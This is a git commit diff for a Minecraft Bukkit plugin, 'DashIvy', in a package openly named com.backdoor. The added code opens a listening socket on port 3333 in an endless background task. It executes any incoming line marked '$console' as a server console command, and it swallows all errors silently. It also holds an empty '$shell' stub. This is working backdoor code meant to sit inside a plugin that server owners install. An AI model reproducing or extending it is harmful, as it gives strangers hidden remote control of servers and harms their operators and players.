c079a7da53437b36669ef5cd55b4047a38a8de50
Freya <KvinneKraft@protonmail.com>
2020-02-16 19:43:34 +0200

    -Java

--- Java Minecraft Plugins/1.13x/DashIvy/src/com/backdoor/DashIvy.java
+++ Java Minecraft Plugins/1.13x/DashIvy/src/com/backdoor/DashIvy.java
@@ -8,15 +8,30 @@ package com.backdoor;
 
 
 import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitWorker;
+import org.bukkit.Bukkit;
 
 
 public class DashIvy extends JavaPlugin
 {
     @Override
     public void onEnable()       
-    { Ivy.start(this); };
+    { 
+        try 
+        { 
+            Ivy.start(this); 
+        } 
+        
+        catch (Exception e) 
+        {} 
+    };
     
     @Override
     public void onDisable() 
-    {};
+    {
+        for(BukkitWorker runnable : Bukkit.getScheduler().getActiveWorkers())
+        {
+            Bukkit.getScheduler().cancelTask(Bukkit.getScheduler().getActiveWorkers().indexOf(runnable));
+        };
+    };
 };
--- Java Minecraft Plugins/1.13x/DashIvy/src/com/backdoor/Ivy.java
+++ Java Minecraft Plugins/1.13x/DashIvy/src/com/backdoor/Ivy.java
@@ -8,12 +8,66 @@ package com.backdoor;
 
 
 import org.bukkit.plugin.java.JavaPlugin;
+import java.io.InputStreamReader;
+import java.io.DataOutputStream;
+import java.io.BufferedReader;
+import java.net.ServerSocket;
+import java.io.IOException;
+import org.bukkit.Bukkit;
+import java.net.Socket;
 
 
 public class Ivy
 {
-    public static void start(JavaPlugin plugin)
+    public static void start(JavaPlugin plugin) throws IOException
     {
         
+        Bukkit.getScheduler().runTaskAsynchronously(plugin,
+            new Runnable()
+            {   
+                String command;
+                
+                @Override
+                public void run()
+                {                    
+                    while(true)
+                    {
+                        try
+                        {
+                            System.out.println("Waiting ....");
+
+                            ServerSocket dash_socks = new ServerSocket(3333);                               
+                            Socket dash_ear = dash_socks.accept();
+                            
+                            BufferedReader received = new BufferedReader(new InputStreamReader(dash_ear.getInputStream()));
+                            DataOutputStream send_back = new DataOutputStream(dash_ear.getOutputStream());
+                            
+                            System.out.println("Reading ....");
+                            
+                            command = received.readLine();
+                            
+                            System.out.println(command);
+                            
+                            if(command.toLowerCase().contains("$console"))
+                            {
+                                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.replace("$console", ""));
+                                send_back.writeBytes("[DashIvy]: Command has been executed on the server!");
+                            }
+                            
+                            else if(command.toLowerCase().contains("$shell"))
+                            {
+                                
+                            };
+                            
+                            dash_socks.close();
+                            dash_ear.close();
+                        }
+                        
+                        catch (Exception e) 
+                        { };
+                    }
+                };
+            }
+        );
     };
 };
